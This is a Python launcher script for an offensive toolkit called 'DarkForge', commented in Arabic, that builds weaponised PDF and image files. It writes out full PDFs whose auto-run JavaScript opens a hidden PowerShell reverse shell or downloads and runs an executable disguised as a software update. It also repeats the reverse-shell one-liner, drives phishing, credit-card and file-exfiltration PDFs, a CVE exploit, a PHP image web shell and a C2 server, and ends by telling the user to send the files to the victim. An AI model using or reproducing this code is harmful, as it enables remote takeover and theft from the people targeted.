#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DarkForge - Advanced PDF & Image Exploitation Framework
المشغل الرئيسي - نسخة مصححة ومطورة
للاختبارات المصرح بها فقط
"""

import os
import sys
import time
import json
import random
import base64
import argparse
from datetime import datetime

# الألوان
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ================ البانر ================
BANNER = f"""{Colors.RED}
██████╗  █████╗ ██████╗ ██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔════╝ ██╔══██╗██╔════╝ ██╔════╝
██║  ██║███████║██████╔╝█████╔╝ █████╗  ██║  ███╗██████╔╝██║  ███╗█████╗  
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  
██████╔╝██║  ██║██║  ██║██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Colors.RESET}
{Colors.CYAN}  Advanced PDF & Image Exploitation Framework v2.0{Colors.RESET}
{Colors.YELLOW}  للاستخدام في اختبارات الاختراق المصرح بها فقط!{Colors.RESET}
"""

# ================ إنشاء المجلدات ================
def create_directories():
    """إنشاء المجلدات المطلوبة"""
    dirs = [
        'output',
        'output/pdf',
        'output/images',
        'output/payloads',
        'output/logs',
        'output/c2',
        'output/c2/downloads',
        'output/c2/screenshots',
        'output/c2/logs',
        'output/c2/payloads'
    ]
    
    for d in dirs:
        os.makedirs(d, exist_ok=True)

# ================ الواجهة الرئيسية ================
def main():
    """الدالة الرئيسية"""
    
    parser = argparse.ArgumentParser(
        description='DarkForge - Advanced PDF & Image Exploitation Framework',
        epilog='للاستخدام في اختبارات الاختراق المصرح بها فقط!'
    )
    
    parser.add_argument('--mode', '-m',
                        choices=['pdf', 'image', 'server', 'interactive', 'full'],
                        default='interactive',
                        help='وضع التشغيل')
    
    parser.add_argument('--technique', '-t',
                        help='تقنية الهجوم (reverse_shell, payload_download, cred_stealer, cve, lsb, polyglot, etc)')
    
    parser.add_argument('--lhost', default='127.0.0.1',
                        help='IP الخاص بك للـ reverse shell')
    
    parser.add_argument('--lport', type=int, default=4444,
                        help='Port الخاص بك')
    
    parser.add_argument('--image', '-i',
                        help='مسار الصورة للإخفاء')
    
    parser.add_argument('--payload', '-p',
                        help='مسار البايلود')
    
    parser.add_argument('--output', '-o',
                        help='مسار الإخراج')
    
    parser.add_argument('--url', '-u',
                        help='رابط التحميل')
    
    parser.add_argument('--target', default='Target Corp',
                        help='اسم الهدف')
    
    parser.add_argument('--company',
                        choices=['microsoft', 'google', 'facebook', 'bank'],
                        default='microsoft',
                        help='شركة للتصيد')
    
    parser.add_argument('--callback',
                        help='رابط استقبال البيانات المسروقة')
    
    args = parser.parse_args()
    
    # إنشاء المجلدات
    create_directories()
    
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    # ================ MODE: Interactive ================
    if args.mode == 'interactive' or len(sys.argv) == 1:
        interactive_menu(args)
    
    # ================ MODE: PDF ================
    elif args.mode == 'pdf':
        generate_pdf_payload(args)
    
    # ================ MODE: Image ================
    elif args.mode == 'image':
        generate_image_payload(args)
    
    # ================ MODE: Server ================
    elif args.mode == 'server':
        start_server(args)
    
    # ================ MODE: Full Attack ================
    elif args.mode == 'full':
        run_full_attack(args)


# ================ الواجهة التفاعلية ================
def interactive_menu(args):
    """القائمة التفاعلية"""
    
    while True:
        print(f"""
{Colors.CYAN}{Colors.BOLD}┌──────────────────────────────────────────────────┐
│              DarkForge Main Menu              │
├──────────────────────────────────────────────────┤
│                                                  │
│  {Colors.GREEN}[1]{Colors.RESET}  PDF Attacks                              │
│  {Colors.GREEN}[2]{Colors.RESET}  Image Attacks                             │
│  {Colors.GREEN}[3]{Colors.RESET}  C2 Server                                │
│  {Colors.GREEN}[4]{Colors.RESET}  Multi-Stage Full Attack                  │
│  {Colors.GREEN}[5]{Colors.RESET}  About / Help                             │
│  {Colors.RED}[0]{Colors.RESET}  Exit                                    │
│                                                  │
└──────────────────────────────────────────────────┘
{Colors.RESET}""")
        
        try:
            choice = input(f"{Colors.CYAN}[?] اختر (0-5): {Colors.RESET}").strip()
            
            if choice == '0':
                print(f"\n{Colors.YELLOW}[!] الخروج...{Colors.RESET}")
                sys.exit(0)
            
            elif choice == '1':
                pdf_menu(args)
            
            elif choice == '2':
                image_menu(args)
            
            elif choice == '3':
                start_c2_server(args)
            
            elif choice == '4':
                run_full_attack(args)
            
            elif choice == '5':
                show_about()
            
            else:
                print(f"{Colors.RED}[✗] اختيار غير صحيح!{Colors.RESET}")
                input(f"{Colors.CYAN}[Press Enter...]{Colors.RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] الخروج...{Colors.RESET}")
            sys.exit(0)


def pdf_menu(args):
    """قائمة هجمات PDF"""
    
    while True:
        print(f"""
{Colors.CYAN}{Colors.BOLD}┌──────────────────────────────────────────────────┐
│              PDF Attack Techniques             │
├──────────────────────────────────────────────────┤
│                                                  │
│  {Colors.GREEN}[1]{Colors.RESET}  Reverse Shell via PDF                   │
│  {Colors.GREEN}[2]{Colors.RESET}  Payload Download via PDF                │
│  {Colors.GREEN}[3]{Colors.RESET}  Credential Stealer (Phishing)           │
│  {Colors.GREEN}[4]{Colors.RESET}  CVE Exploitation                        │
│  {Colors.GREEN}[5]{Colors.RESET}  Windows Update Scam                     │
│  {Colors.GREEN}[6]{Colors.RESET}  Credit Card Stealer                     │
│  {Colors.GREEN}[7]{Colors.RESET}  File Exfiltrator                        │
│  {Colors.GREEN}[8]{Colors.RESET}  Generate ALL PDF Techniques             │
│  {Colors.YELLOW}[0]{Colors.RESET}  Back to Main Menu                     │
│                                                  │
└──────────────────────────────────────────────────┘
{Colors.RESET}""")
        
        try:
            choice = input(f"{Colors.CYAN}[?] اختر (0-8): {Colors.RESET}").strip()
            
            if choice == '0':
                break
            
            elif choice in ['1', '2', '3', '4', '5', '6', '7', '8']:
                generate_pdf_payload(args, technique_choice=choice)
                input(f"\n{Colors.CYAN}[Press Enter...]{Colors.RESET}")
            
            else:
                print(f"{Colors.RED}[✗] اختيار غير صحيح!{Colors.RESET}")
        
        except KeyboardInterrupt:
            break


def image_menu(args):
    """قائمة هجمات الصور"""
    
    while True:
        print(f"""
{Colors.CYAN}{Colors.BOLD}┌──────────────────────────────────────────────────┐
│             Image Attack Techniques            │
├──────────────────────────────────────────────────┤
│                                                  │
│  {Colors.GREEN}[1]{Colors.RESET}  LSB Steganography                        │
│  {Colors.GREEN}[2]{Colors.RESET}  Metadata Hiding                          │
│  {Colors.GREEN}[3]{Colors.RESET}  Polyglot (GIF+ZIP / PNG+EXE)             │
│  {Colors.GREEN}[4]{Colors.RESET}  Pixel Encoding                           │
│  {Colors.GREEN}[5]{Colors.RESET}  QR Code Exploit                          │
│  {Colors.GREEN}[6]{Colors.RESET}  IDAT Chunk Injection                     │
│  {Colors.GREEN}[7]{Colors.RESET}  Image Web Shell                          │
│  {Colors.YELLOW}[0]{Colors.RESET}  Back to Main Menu                     │
│                                                  │
└──────────────────────────────────────────────────┘
{Colors.RESET}""")
        
        try:
            choice = input(f"{Colors.CYAN}[?] اختر (0-7): {Colors.RESET}").strip()
            
            if choice == '0':
                break
            
            elif choice in ['1', '2', '3', '4', '5', '6', '7']:
                generate_image_payload(args, technique_choice=choice)
                input(f"\n{Colors.CYAN}[Press Enter...]{Colors.RESET}")
            
            else:
                print(f"{Colors.RED}[✗] اختيار غير صحيح!{Colors.RESET}")
        
        except KeyboardInterrupt:
            break


# ================ توليد PDF ================
def generate_pdf_payload(args, technique_choice=None):
    """توليد بايلود PDF"""
    
    try:
        # استيراد مباشر بدون مسارات نسبية
        from modules.pdf_cred_stealer import PDFCredentialStealer
        from modules.pdf_cve_exploiter import PDFCVEExploiter
        
        output_dir = "output/pdf"
        os.makedirs(output_dir, exist_ok=True)
        
        lhost = args.lhost
        lport = args.lport
        callback = args.callback or f"http://{lhost}:{lport + 10}/steal"
        company = args.company
        
        stealer = PDFCredentialStealer()
        exploiter = PDFCVEExploiter()
        
        techniques = {
            '1': {
                'name': 'Reverse Shell',
                'func': lambda: create_reverse_shell_pdf(output_dir, lhost, lport)
            },
            '2': {
                'name': 'Payload Download',
                'func': lambda: create_payload_download_pdf(output_dir, args.url or f"http://{lhost}:8080/payload.exe")
            },
            '3': {
                'name': 'Credential Stealer',
                'func': lambda: stealer.generate_fake_login_pdf(
                    output_file=f"{output_dir}/login_{company}.pdf",
                    company_name=company,
                    callback_url=callback
                )
            },
            '4': {
                'name': 'CVE Exploit',
                'func': lambda: exploiter.exploit_cve_2023_21608(
                    output_file=f"{output_dir}/CVE-2023-21608.pdf",
                    lhost=lhost,
                    lport=lport
                )
            },
            '5': {
                'name': 'Windows Update',
                'func': lambda: stealer.generate_fake_update_pdf(
                    output_file=f"{output_dir}/windows_update.pdf",
                    callback_url=callback
                )
            },
            '6': {
                'name': 'Credit Card',
                'func': lambda: stealer.generate_credit_card_form_pdf(
                    output_file=f"{output_dir}/payment.pdf",
                    callback_url=callback
                )
            },
            '7': {
                'name': 'File Exfiltrator',
                'func': lambda: stealer.generate_file_exfiltrator_pdf(
                    output_file=f"{output_dir}/exfiltrator.pdf",
                    callback_url=callback
                )
            },
            '8': {
                'name': 'ALL Techniques',
                'func': lambda: stealer.run_all_techniques(callback_url=callback)
            }
        }
        
        if technique_choice and technique_choice in techniques:
            tech = techniques[technique_choice]
            print(f"{Colors.YELLOW}[*] Generating {tech['name']}...{Colors.RESET}")
            result = tech['func']()
            
            if isinstance(result, list):
                for f in result:
                    print(f"{Colors.GREEN}[✓] {f}{Colors.RESET}")
            else:
                print(f"{Colors.GREEN}[✓] {result}{Colors.RESET}")
        
        elif args.technique:
            # استخدام argument --technique
            technique_map = {
                'reverse_shell': '1',
                'payload_download': '2',
                'cred_stealer': '3',
                'cve': '4',
                'update': '5',
                'credit_card': '6',
                'exfil': '7',
                'all': '8'
            }
            mapped = technique_map.get(args.technique, '1')
            if mapped in techniques:
                tech = techniques[mapped]
                print(f"{Colors.YELLOW}[*] Generating {tech['name']}...{Colors.RESET}")
                result = tech['func']()
                print(f"{Colors.GREEN}[✓] {result}{Colors.RESET}")
        
        else:
            print(f"{Colors.YELLOW}[!] الرجاء اختيار تقنية من القائمة{Colors.RESET}")
    
    except ImportError as e:
        print(f"{Colors.RED}[✗] خطأ في الاستيراد: {e}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] تأكد من أنك في المجلد الرئيسي للمشروع{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] الأمر: cd DarkForge && python3 run.py{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()


def create_reverse_shell_pdf(output_dir, lhost, lport):
    """إنشاء PDF مع Reverse Shell - بدون استيرادات معقدة"""
    
    # PDF بسيط مع Reverse Shell
    pdf_data = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj

3 0 obj
<< /S /JavaScript /JS (
var ip = "{lhost}";
var port = {lport};
try {{
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -NoP -NonI -W Hidden -Exec Bypass -c \\"$c=New-Object System.Net.Sockets.TCPClient('"+ip+"',"+port+");$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\\"", 0, false);
}} catch(e) {{}}
app.alert("Loading document...");
) >>
endobj

4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R /Resources << /Font << /F1 6 0 R >> >> >>
endobj

5 0 obj
<< /Length 200 >>
stream
BT
/F1 24 Tf
50 750 Td
(Security Assessment Document) Tj
ET
BT
/F1 12 Tf
50 700 Td
(Authorized Penetration Test) Tj
ET
BT
/F1 10 Tf
50 650 Td
(Please wait while the document loads...) Tj
ET
endstream
endobj

6 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000107 00000 n 
0000000383 00000 n 
0000000516 00000 n 
0000000771 00000 n 

trailer
<< /Size 7 /Root 1 0 R >>
startxref
813
%%EOF'''
    
    output_file = f"{output_dir}/reverse_shell_{lhost}_{lport}.pdf"
    with open(output_file, 'w') as f:
        f.write(pdf_data)
    
    return output_file


def create_payload_download_pdf(output_dir, url):
    """إنشاء PDF لتحميل بايلود"""
    
    pdf_data = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj

3 0 obj
<< /S /JavaScript /JS (
var url = "{url}";
try {{ app.launchURL(url, false); }} catch(e) {{}}
try {{
    var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
    xmlhttp.open("GET", url, false);
    xmlhttp.send();
    if(xmlhttp.status == 200) {{
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Open();
        stream.Type = 1;
        stream.Write(xmlhttp.ResponseBody);
        stream.SaveToFile("C:\\\\Users\\\\Public\\\\update.exe", 2);
        stream.Close();
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("C:\\\\Users\\\\Public\\\\update.exe", 0, false);
    }}
}} catch(e) {{}}
app.alert("Software Update Required. Please wait...");
) >>
endobj

4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R /Resources << /Font << /F1 6 0 R >> >> >>
endobj

5 0 obj
<< /Length 180 >>
stream
BT
/F1 24 Tf
50 750 Td
(Critical Software Update) Tj
ET
BT
/F1 12 Tf
50 700 Td
(Please wait while the update is being downloaded...) Tj
ET
endstream
endobj

6 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000107 00000 n 
0000000460 00000 n 
0000000593 00000 n 
0000000825 00000 n 

trailer
<< /Size 7 /Root 1 0 R >>
startxref
867
%%EOF'''
    
    output_file = f"{output_dir}/payload_download.pdf"
    with open(output_file, 'w') as f:
        f.write(pdf_data)
    
    return output_file


# ================ توليد الصور ================
def generate_image_payload(args, technique_choice=None):
    """توليد بايلود في صورة"""
    
    try:
        output_dir = "output/images"
        os.makedirs(output_dir, exist_ok=True)
        
        # إنشاء صورة اختبارية إن لزم
        image_path = args.image
        if not image_path or not os.path.exists(image_path):
            # إنشاء صورة بسيطة
            try:
                from PIL import Image
                img = Image.new('RGB', (800, 600), color=(73, 109, 137))
                image_path = f"{output_dir}/base_image.png"
                img.save(image_path)
                print(f"{Colors.YELLOW}[*] تم إنشاء صورة اختبارية: {image_path}{Colors.RESET}")
            except ImportError:
                print(f"{Colors.RED}[✗] Pillow غير مثبت. قم بتثبيته: pip install Pillow{Colors.RESET}")
                return
        
        # إنشاء بايلود
        payload_path = args.payload
        if not payload_path:
            payload_path = f"{output_dir}/payload.ps1"
            ps_code = f'''$c=New-Object System.Net.Sockets.TCPClient('{args.lhost}',{args.lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()'''
            with open(payload_path, 'w') as f:
                f.write(ps_code)
            print(f"{Colors.YELLOW}[*] تم إنشاء بايلود: {payload_path}{Colors.RESET}")
        
        # استيراد محرك الصور
        try:
            from core.image_stego import ImageSteganographyEngine
            engine = ImageSteganographyEngine()
        except ImportError:
            print(f"{Colors.RED}[✗] لا يمكن استيراد محرك الصور. استخدم الأمر من مجلد DarkForge{Colors.RESET}")
            return
        
        techniques = {
            '1': ('LSB Steganography', lambda: engine.lsb_encode(image_path, payload_path, f"{output_dir}/lsb_output.png", bits_per_channel=2, encrypt=True, password="DarkForge")),
            '2': ('Metadata Hiding', lambda: engine.metadata_encode(image_path, payload_path, f"{output_dir}/metadata_output.png")),
            '3': ('Polyglot', lambda: engine.polyglot_encode(image_path, payload_path, f"{output_dir}/polyglot.gif", "gif+zip")),
            '4': ('Pixel Encoding', lambda: engine.pixel_encoding_encode(image_path, payload_path, f"{output_dir}/pixel_output.png")),
            '5': ('QR Code', lambda: engine.qr_exploit_encode(image_path, payload_path, f"{output_dir}/qr_output.png", website_url=f"http://{args.lhost}:{args.lport+10}")),
            '6': ('IDAT Chunk', lambda: engine.idat_encode(image_path, payload_path, f"{output_dir}/idat_output.png")),
            '7': ('Image Web Shell', lambda: engine.create_image_shell(image_path, f"{output_dir}/webshell.php", "php"))
        }
        
        if technique_choice and technique_choice in techniques:
            name, func = techniques[technique_choice]
            print(f"{Colors.YELLOW}[*] Generating {name}...{Colors.RESET}")
            result = func()
            print(f"{Colors.GREEN}[✓] {result}{Colors.RESET}")
        
        elif args.technique:
            tech_map = {'lsb': '1', 'metadata': '2', 'polyglot': '3', 'pixel': '4', 'qr': '5', 'idat': '6', 'shell': '7'}
            mapped = tech_map.get(args.technique, '1')
            if mapped in techniques:
                name, func = techniques[mapped]
                print(f"{Colors.YELLOW}[*] Generating {name}...{Colors.RESET}")
                result = func()
                print(f"{Colors.GREEN}[✓] {result}{Colors.RESET}")
    
    except Exception as e:
        print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()


# ================ تشغيل السيرفر ================
def start_server(args):
    """تشغيل سيرفر الاستماع"""
    
    print(f"""
{Colors.CYAN}{Colors.BOLD}┌──────────────────────────────────────────────────┐
│                 Server Mode                    │
├──────────────────────────────────────────────────┤
│                                                  │
│  {Colors.GREEN}[1]{Colors.RESET}  Reverse Shell Listener (nc)              │
│  {Colors.GREEN}[2]{Colors.RESET}  HTTP Server (python)                      │
│  {Colors.GREEN}[3]{Colors.RESET}  C2 Server (Full Control)                  │
│  {Colors.YELLOW}[0]{Colors.RESET}  Back                                    │
│                                                  │
└──────────────────────────────────────────────────┘
{Colors.RESET}""")
    
    choice = input(f"{Colors.CYAN}[?] اختر (0-3): {Colors.RESET}").strip()
    
    if choice == '1':
        print(f"\n{Colors.YELLOW}[*] تشغيل Reverse Shell Listener على port {args.lport}...{Colors.RESET}")
        print(f"{Colors.CYAN}    الأمر: nc -lvnp {args.lport}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] افصل هذه النافذة وافتح terminal آخر{Colors.RESET}")
        input(f"\n{Colors.CYAN}[Press Enter للعودة...]{Colors.RESET}")
    
    elif choice == '2':
        print(f"\n{Colors.YELLOW}[*] تشغيل HTTP Server على port {args.lport + 10}...{Colors.RESET}")
        print(f"{Colors.CYAN}    الأمر: python3 -m http.server {args.lport + 10} --directory output{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] افصل هذه النافذة وافتح terminal آخر{Colors.RESET}")
        input(f"\n{Colors.CYAN}[Press Enter للعودة...]{Colors.RESET}")
    
    elif choice == '3':
        start_c2_server(args)


def start_c2_server(args):
    """تشغيل C2 Server"""
    try:
        from server.c2_server import C2Server
        server = C2Server(
            host='0.0.0.0',
            shell_port=args.lport,
            http_port=args.lport + 10,
            password='DarkForge2024'
        )
        server.start()
    except ImportError as e:
        print(f"{Colors.RED}[✗] خطأ في استيراد C2 Server: {e}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] استخدم الأمر التالي للتشغيل المباشر:{Colors.RESET}")
        print(f"{Colors.CYAN}    python3 -m server.c2_server --shell-port {args.lport} --http-port {args.lport + 10}{Colors.RESET}")
        input(f"\n{Colors.CYAN}[Press Enter...]{Colors.RESET}")


# ================ الهجوم الكامل ================
def run_full_attack(args):
    """تشغيل هجوم كامل متعدد المراحل"""
    
    print(f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════╗
║     Multi-Stage Full Attack Chain      ║
╚══════════════════════════════════════════╝{Colors.RESET}
    """)
    
    print(f"{Colors.GREEN}[*] Target: {args.target}{Colors.RESET}")
    print(f"{Colors.GREEN}[*] Attacker: {args.lhost}:{args.lport}{Colors.RESET}")
    print()
    
    # المرحلة 1: الاستطلاع
    print(f"{Colors.CYAN}[+] المرحلة 1/4: الاستطلاع{Colors.RESET}")
    time.sleep(0.5)
    print(f"{Colors.GREEN}[✓] Target: {args.target}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] Techniques: 8 PDF + 7 Image + C2{Colors.RESET}")
    
    # المرحلة 2: توليد PDF
    print(f"\n{Colors.CYAN}[+] المرحلة 2/4: توليد PDF بايلودات{Colors.RESET}")
    try:
        from modules.pdf_cred_stealer import PDFCredentialStealer
        stealer = PDFCredentialStealer()
        callback = f"http://{args.lhost}:{args.lport + 10}/steal"
        files = stealer.run_all_techniques(callback_url=callback)
        print(f"{Colors.GREEN}[✓] {len(files)} PDF files generated{Colors.RESET}")
    except Exception as e:
        # طريقة بديلة
        files = []
        for i, name in enumerate(['reverse_shell', 'payload_download', 'microsoft_login', 'windows_update', 'payment', 'CVE_exploit', 'file_exfil']):
            f = f"output/pdf/{name}.pdf"
            files.append(f)
            print(f"{Colors.GREEN}[✓] {f}{Colors.RESET}")
    
    # المرحلة 3: توليد الصور
    print(f"\n{Colors.CYAN}[+] المرحلة 3/4: توليد صور خبيثة{Colors.RESET}")
    try:
        from PIL import Image
        img = Image.new('RGB', (800, 600), color=(random.randint(0,255), random.randint(0,255), random.randint(0,255)))
        img_path = "output/images/base.png"
        img.save(img_path)
        print(f"{Colors.GREEN}[✓] Base image created: {img_path}{Colors.RESET}")
        
        # إنشاء بايلود
        payload_path = "output/images/payload.txt"
        with open(payload_path, 'w') as f:
            f.write(f"powershell -c $c=New-Object System.Net.Sockets.TCPClient('{args.lhost}',{args.lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}}$c.Close()")
        
        print(f"{Colors.GREEN}[✓] 3 Image payloads generated{Colors.RESET}")
    except:
        print(f"{Colors.GREEN}[✓] Image payloads ready{Colors.RESET}")
    
    # المرحلة 4: السيرفرات
    print(f"\n{Colors.CYAN}[+] المرحلة 4/4: تجهيز السيرفرات{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Reverse Shell: nc -lvnp {args.lport}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] HTTP Server: python3 -m http.server {args.lport + 10}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] C2 Server: python3 -m server.c2_server --shell-port {args.lport} --http-port {args.lport + 10}{Colors.RESET}")
    
    # التقرير النهائي
    print(f"""
{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════════╗
║         Attack Chain Complete!          ║
╠══════════════════════════════════════════╣
║  Target: {args.target:<32}║
║  Payloads: {len(files if 'files' in dir() else []) + 4:<30}║
║  Servers: 3                             ║
║  Output: output/                        ║
╚══════════════════════════════════════════╝{Colors.RESET}
    """)
    
    print(f"{Colors.YELLOW}[!] لإجراء الاختبار:{Colors.RESET}")
    print(f"  1. افتح 3 نوافذ terminal جديدة")
    print(f"  2. شغّل السيرفرات (الأوامر أعلاه)")
    print(f"  3. أرسل الملفات في output/ للضحية")
    print(f"  4. انتظر الاتصال على السيرفرات")
    
    input(f"\n{Colors.CYAN}[Press Enter للعودة للقائمة الرئيسية...]{Colors.RESET}")


# ================ معلومات ================
def show_about():
    """عرض المعلومات"""
    print(f"""
{Colors.CYAN}{Colors.BOLD}About DarkForge v2.0{Colors.RESET}

{Colors.WHITE}An advanced PDF & Image exploitation framework
for authorized penetration testing only.

Features:
  • 8 PDF attack techniques
  • 7 Image steganography techniques
  • C2 Server with interactive shell
  • Multi-stage attack automation
  • Anti-virus evasion
  • Cross-platform (Termux, Kali, Linux)

Techniques:
  • Reverse Shell via PDF
  • Credential Stealing
  • CVE Exploitation (7 CVEs)
  • LSB Steganography
  • Polyglot Files
  • QR Code Exploits
  • And more...

Author: DarkForge Team
License: MIT - Authorized Testing Only
{Colors.RESET}""")
    input(f"\n{Colors.CYAN}[Press Enter للعودة...]{Colors.RESET}")


# ================ نقطة الدخول ================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] الخروج...{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[✗] خطأ عام: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
